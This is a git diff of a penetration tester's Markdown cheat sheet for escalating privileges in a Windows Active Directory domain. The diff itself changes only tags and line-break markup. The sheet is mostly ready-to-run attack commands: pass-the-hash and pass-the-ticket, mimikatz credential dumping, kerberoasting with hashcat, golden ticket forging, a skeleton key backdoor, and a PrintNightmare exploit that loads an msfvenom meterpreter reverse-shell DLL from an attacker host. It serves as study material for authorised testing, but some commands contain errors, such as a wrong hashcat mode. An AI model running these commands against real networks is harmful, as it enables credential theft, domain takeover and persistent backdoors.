@@ -2,6 +2,8 @@
 title: 5 – Privesc Windows Domain
 summary: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
 description: Privilege Escalation step – a note for elevating privileges on a Windows Domain.
+tags:
+  - privesc-windows-domain
 ---
 
 # Resources
@@ -22,24 +24,24 @@ Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
 
  > 
- > **<font color=red>Get-NetUser</font>**</br>
+ > **<font color=red>Get-NetUser</font>**<br>
  > Enumerate users and their properties. 
  > 
- > **<font color=red>Get-NetUser | select cn</font>**</br>
+ > **<font color=red>Get-NetUser | select cn</font>**<br>
  > Enumerate domain Common Names for users.
  > 
- > **<font color=red>Get-NetUser | select description</font>**</br>
+ > **<font color=red>Get-NetUser | select description</font>**<br>
  > Enumeration description for users.
 
  > 
- > **<font color=red>Get-UserPropery -Properties logoncount</font>**</br>
+ > **<font color=red>Get-UserPropery -Properties logoncount</font>**<br>
  > Show connection count (might see a honeypot account).
 
  > 
- > **<font color=red>Get-NetGroupMember -name "Domain Admins"</font>**</br>
+ > **<font color=red>Get-NetGroupMember -name "Domain Admins"</font>**<br>
  > Enumerate users belonging to admin groups.
  > 
- > **<font color=red>Get-NetGroup -name \*admin\*</font>**</br>
+ > **<font color=red>Get-NetGroup -name \*admin\*</font>**<br>
  > Enumerate all groups with admin in it.
 
 # Enumerate Domain Information
@@ -50,25 +52,25 @@ Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
 
  > 
- > **<font color=red>Get-NetDomain</font>**</br>
+ > **<font color=red>Get-NetDomain</font>**<br>
  > Infos about the domain.
  > 
- > **<font color=red>Get-NetDomainController</font>**</br>
+ > **<font color=red>Get-NetDomainController</font>**<br>
  > Info about the Domain Controller.
 
  > 
- > **<font color=red>Get-NetComputer</font>**</br>
+ > **<font color=red>Get-NetComputer</font>**<br>
  > Infos about servers and computers in the domain.
 
  > 
- > **<font color=red>Get-DomainPolicy</font>**</br>
+ > **<font color=red>Get-DomainPolicy</font>**<br>
  > Infos about Domain Policy.
 
  > 
- > **<font color=red>Get-NetGPO</font>**</br>
+ > **<font color=red>Get-NetGPO</font>**<br>
  > List GPOs.
  > 
- > **<font color=red>Get-NetGPO | select displayname, whenchanged</font>**</br>
+ > **<font color=red>Get-NetGPO | select displayname, whenchanged</font>**<br>
  > List policies with when they were changed.
 
 # Pass the Password
@@ -81,22 +83,22 @@ Credit: The Hacker Recipes - https://www.thehacker.recipes/ad/movement/ntlm
 
 
  > 
- > **<font color=red>crackmapexec smb</font> \[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-d</font> \[TARGET_DOMAIN\] <font color=red>-u</font> \[mySamName\] <font color=red>-p</font> \[myUserPassword\]**</br>
+ > **<font color=red>crackmapexec smb</font> \[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-d</font> \[TARGET_DOMAIN\] <font color=red>-u</font> \[mySamName\] <font color=red>-p</font> \[myUserPassword\]**<br>
  > Pass the Password around the network to find pwnable machines.
 
 ![tool-crackmapexec-example.png](../../attachments/tool-crackmapexec-example.png)
 
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/psexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
+ > **<font color=red>python3 /opt/impacket/examples/psexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**<br>
  > Get a shell on the tageted machine (Psexec is the most noisy).
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/smbexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
+ > **<font color=red>python3 /opt/impacket/examples/smbexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**<br>
  > Get a shell on the tageted machine.
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
+ > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**<br>
  > Get a shell on the tageted machine.
 
 # GPP Attack
@@ -115,14 +117,14 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**<br>
  > Detect vulnerable GPP policies (credentials encrypted with leaked key).
 
 #### Hands On
 
 
  > 
- > **<font color=red>gpg-decrypt</font> mycPasswordEncrypted**</br>
+ > **<font color=red>gpg-decrypt</font> mycPasswordEncrypted**<br>
  > Decrypt GPP enmbedded credentials.
 
 # Hash Dump
@@ -133,7 +135,7 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
 
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**</br>
+ > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**<br>
  > Connect to the target and dump hashes. 
 
 ---
@@ -142,20 +144,20 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
 
 
  > 
- > **<font color=red>privilege::debug</font>**</br>
+ > **<font color=red>privilege::debug</font>**<br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
  > 
- > **<font color=red>lsadump::lsa /patch</font>**</br>
+ > **<font color=red>lsadump::lsa /patch</font>**<br>
   
  > Dump LSA Hashes (Local Security Authority).
 
  > 
- > **<font color=red>lsadump::sam</font>**</br>
+ > **<font color=red>lsadump::sam</font>**<br>
  > Dump SAM NT Hashes.
 
  > 
- > **<font color=red>sekurlsa::logonpasswords</font>**</br>
+ > **<font color=red>sekurlsa::logonpasswords</font>**<br>
  > Dump Hashes from LSAA Memory (Hashes of currently logged-in users).
 
 # Pass the Hash
@@ -184,20 +186,20 @@ There are two different hash types, `LM` and `NT`:
 
 
  > 
- > **<font color=red>crackmapexec smb </font>\[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-u</font> \[mySamName\] <font color=red>-H</font> \[myUserNTHASH\] <font color=red>--local-auth</font>**</br>
+ > **<font color=red>crackmapexec smb </font>\[TARGET_NETWORK_ADDRESS\]<font color=red>/</font>\[TARGET_CIDR\] <font color=red>-u</font> \[mySamName\] <font color=red>-H</font> \[myUserNTHASH\] <font color=red>--local-auth</font>**<br>
  > Pass the Hash attack (NT Hash) around the network to find vulnerable machines.
 
 
  > 
- > **<font color=red>evil-winrm -i</font> \[TARGET_IP\] <font color=red>-u</font> \[myUser\] <font color=red>-H </font>\[myUserNTHASH\]**</br>
+ > **<font color=red>evil-winrm -i</font> \[TARGET_IP\] <font color=red>-u</font> \[myUser\] <font color=red>-H </font>\[myUserNTHASH\]**<br>
  > Pass the Hash attack (NT Hash).
 
 #### Pass LM+NT Hash
 
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/psexec.py </font>\[TARGET_DOMAIN\]<font color=red>/</font>\[mySamName\]<font color=red>@</font>\[TARGET_IP\] <font color=red>-hashes</font> \[myUserLMHASH\]<font color=red>:</font>\[myUserNTHASH\]**</br>
- > Pass the Hash attack (LM+NT).</br>
+ > **<font color=red>python3 /opt/impacket/examples/psexec.py </font>\[TARGET_DOMAIN\]<font color=red>/</font>\[mySamName\]<font color=red>@</font>\[TARGET_IP\] <font color=red>-hashes</font> \[myUserLMHASH\]<font color=red>:</font>\[myUserNTHASH\]**<br>
+ > Pass the Hash attack (LM+NT).<br>
  > Note: If the LM Hash is `AAD3B435B51404EEAAD3B435B51404EE` and the NT Hash is `31D6CFE0D16AE931B73C59D7E0C089C0` this means there is no password for this user (by default the user won't be able to authenticate (with empty password) unless the `PASSWD_NOTREQD` flag is set).
 
 ### Mitigation
@@ -223,26 +225,26 @@ There are two different hash types, `LM` and `NT`:
 
 
  > 
- > **<font color=red>privilege::debug</font>**</br>
+ > **<font color=red>privilege::debug</font>**<br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
 
  > 
- > **<font color=red>sekurlsa::tickets /export</font>**</br>
+ > **<font color=red>sekurlsa::tickets /export</font>**<br>
  > Export all `.kirbi` tickets into the current directory.
 
 ##### Find others Kirbi Tickets (Password Spray)
 
 
  > 
- > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**</br>
+ > **<font color=red>Rubeus.exe brute /password:</font>myPassword <font color=red>/noticket</font>**<br>
  > Spray a password against all users in current domain and return the `.kirbi` TGT of users that use this password.
 
 ##### Pass the Ticket
 
 
  > 
- > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
+ > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**<br>
  > Cache and impersonate the given ticket.
 
 # Token Impersonation
@@ -268,13 +270,13 @@ They are two types of tokens:
 If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.
 
  > 
- > **<font color=red>load incognito</font>**</br>
+ > **<font color=red>load incognito</font>**<br>
  > Load icognito module.
  > 
- > **<font color=red>list_tokens -u</font>**</br>
+ > **<font color=red>list_tokens -u</font>**<br>
  > List Delegation Tokens available (not sure of the flag maybe `-g`).
  > 
- > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
+ > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**<br>
  > Impersonate token.
 
 To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 
@@ -282,11 +284,11 @@ To determine rights, Windows uses the Primary Token of the process and not the i
 The safest to pick is **services.exe**.
 
  > 
- > **<font color=red>migrate</font> 668**</br>
+ > **<font color=red>migrate</font> 668**<br>
  > Migrate to process 668.
 
  > 
- > **<font color=red>rev2self</font>**</br>
+ > **<font color=red>rev2self</font>**<br>
  > Revert to previous user.
 
 #### Mitigation
@@ -314,29 +316,29 @@ SPN (Service Principal Name) is the mapping between a service and the account or
 ##### With Impacket (remote)
 
  > 
- > **<font color=red>setspn -T medin -Q ​ */*</font>**</br>
+ > **<font color=red>setspn -T medin -Q ​ */*</font>**<br>
  > Enumerate SPN.
 
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
+ > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**<br>
  > Dump Kerberos hash of kerberoastable users.
 
 
  > 
- > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**<br>
  > Crack Kerberos KRB_TGS_REP hash.
 
 ##### With RUBEUS (on target machine)
 
 
  > 
- > **<font color=red>Rubeus.exe kerberoast</font>**</br>
+ > **<font color=red>Rubeus.exe kerberoast</font>**<br>
  > Dump Kerberos hashes of kerberoastable users (same as GetUserSPNs.py but on the target machine).
 
 
  > 
- > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**<br>
  > Crack Kerberos KRB_TGS_REP hash.
 
 #### Mitigation
@@ -352,12 +354,12 @@ This attack require users with pre-authentication disabled.
 
 
  > 
- > **<font color=red>Rubeus.exe asreproast</font>**</br>
+ > **<font color=red>Rubeus.exe asreproast</font>**<br>
  > Dump Kerberos hashes of AS_REProastable users. (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
 
 
  > 
- > **<font color=red>hashcat -a 0 -m 1820</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > **<font color=red>hashcat -a 0 -m 1820</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**<br>
  > Crack Kerberos KRB_AS_REP hash.
 
 # Golden/Silver Ticket
@@ -376,14 +378,14 @@ A Silver Ticker is TGS (Ticket Granting Service).
 
 
  > 
- > **<font color=red>privilege::debug</font>**</br>
+ > **<font color=red>privilege::debug</font>**<br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
 #### Hands On (MIMIKATZ)
 
 
  > 
- > **<font color=red>lsadump::lsa /inject /name:</font>krbtgt**</br>
+ > **<font color=red>lsadump::lsa /inject /name:</font>krbtgt**<br>
  > Dump hash and security identifier required to create a Golden Ticket. 
 
 Note: To create a Silver Ticket, change the `/name:` to a domain admin account or a service account.
@@ -392,22 +394,22 @@ Note: To create a Silver Ticket, change the `/name:` to a domain admin account o
 Credit: TCM Security
 
  > 
- > **<font color=red>kerberos::golden /user:</font>Administrator <font color=red>/domain:</font>mycontroller.local <font color=red>/sid:</font>S-1-5-21-432953485-3795405108-1502158860  <font color=red>/krbtgt:</font>72cd714611b64cd4d5550cd2759db3f6 <font color=red>/id:500 /ptt</font>**</br>
+ > **<font color=red>kerberos::golden /user:</font>Administrator <font color=red>/domain:</font>mycontroller.local <font color=red>/sid:</font>S-1-5-21-432953485-3795405108-1502158860  <font color=red>/krbtgt:</font>72cd714611b64cd4d5550cd2759db3f6 <font color=red>/id:500 /ptt</font>**<br>
  > Create a golden ticket (`/ptt` stands for Pass The Ticket, if we don’t put it, the command will save the ticket to a file).
 
 Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtgt:` slot, the sid of the service account into `/sid:`, and change the `/id:` to 1103.
 
 
  > 
- > **<font color=red>misc::cmd</font>**</br>
+ > **<font color=red>misc::cmd</font>**<br>
  > Open a new elevated command prompt with the given ticket in Minikatz.
 
  > 
- > **<font color=red>dir \\\\TARGET-MACHINE-NAME\\c$</font>**</br>
+ > **<font color=red>dir \\\\TARGET-MACHINE-NAME\\c$</font>**<br>
  > List files in c drive of the machine.
 
  > 
- > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**</br>
+ > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**<br>
  > Get a shell on the machine.
 
 # Exploit
@@ -422,24 +424,24 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
 
 
  > 
- > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
+ > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**<br>
  > Generate a malicious DLL (meterpreter reverse shell).
 
 ##### Create an SMB Share to Serve the Malicious DLL
 
 
  > 
- > **<font color=red>python3 /opt/impacket/examples/smbserver.py</font> myShareName /path/to/folder/ <font color=red>-smb2support</font>**</br>
+ > **<font color=red>python3 /opt/impacket/examples/smbserver.py</font> myShareName /path/to/folder/ <font color=red>-smb2support</font>**<br>
  > Set up an SMB share.
 
 ##### Set up Handler
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**<br>
  > 
- > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*</br>
- > **<font color=red>exploit</font>**</br>
+ > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*<br>
+ > **<font color=red>exploit</font>**<br>
  > Handler for Windows Meterpreter.
 
 ##### Exploit
@@ -448,7 +450,7 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
 
  > 
  > **<font color=red>python3 /opt/impacket/examples/CVE-2021-1675.py</font> myUser<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\] <font color=red>'\\\\</font>\[ATTACKER_IP\]<font color=red>\\</font>
-**myShareName**<font color=red>\\</font>msfvenom_revshell.dll'**<font color=red></font></br>
+**myShareName**<font color=red>\\</font>msfvenom_revshell.dll'**<font color=red></font><br>
  > Run the exploit: privilege escalation (might display an error but meterpreter session is on).
 
 # Persistence and Evasion
@@ -465,18 +467,18 @@ The Skeleton Key is backdoor: this attack set a master password for domain Admin
 
 
  > 
- > **<font color=red>privilege::debug</font>**</br>
+ > **<font color=red>privilege::debug</font>**<br>
  > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.
 
 #### Hands On
 
 
  > 
- > **<font color=red>misc::skeleton</font>**</br>
+ > **<font color=red>misc::skeleton</font>**<br>
  > Create a backdoor with credentials "mimikatz". 
 
  > 
- > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**</br>
+ > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**<br>
  > List C: drive content using Skleton Key backdoor. 
 
 ---
